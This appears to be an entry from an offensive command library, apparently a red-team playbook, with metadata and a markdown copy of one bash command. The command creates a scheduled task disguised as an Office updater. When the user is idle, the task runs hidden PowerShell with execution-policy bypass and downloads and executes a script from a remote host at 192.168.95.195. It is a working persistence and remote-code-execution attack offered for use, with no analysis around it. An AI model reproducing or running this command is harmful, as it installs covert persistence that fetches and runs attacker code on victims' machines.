---
id: 35a4b541-0ea6-48e9-9034-74d2d32eefc9
name: (X64) - On User Idle (30mins)
type: command
executor: bash
data: 'schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
  -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object
  net.webclient).downloadstring(''''''http://192.168.95.195:8080/kBBldxiub6''''''))''"
  /sc onidle /i 30

  '
output: null
created_at: '2020-07-14T18:21:10.247121+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# (X64) - On User Idle (30mins)

```bash
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30

```


